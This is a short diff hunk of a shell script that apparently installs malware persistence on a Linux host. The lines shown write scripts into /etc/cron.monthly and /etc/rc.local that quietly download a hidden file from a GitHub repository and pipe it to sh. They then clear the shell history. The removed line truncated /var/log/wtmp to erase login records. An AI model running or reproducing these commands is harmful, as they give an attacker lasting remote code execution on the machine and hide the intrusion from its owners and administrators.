@@ -12,6 +12,5 @@ echo -e '#!/bin/sh\n\nwget --quiet https://raw.githubusercontent.com/Jeffry38/t0
 echo -e '#!/bin/sh\n\nwget --quiet https://raw.githubusercontent.com/Jeffry38/t00lz/master/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/cron.monthly/2;chmod 777 /etc/cron.monthly/2;
 
 echo -e '#!/bin/sh\n\nwget --quiet https://raw.githubusercontent.com/Jeffry38/t00lz/master/.x -O- 3>/dev/null|sh>/dev/null 2>&1' > /etc/rc.local;chmod +x /etc/rc.local;
-head -c -384 /var/log/wtmp > .wtmp; mv .wtmp /var/log/wtmp; chmod 664 /var/log/wtmp; chown root:utmp /var/log/wtmp;
 history -c;
 unset history;history -w
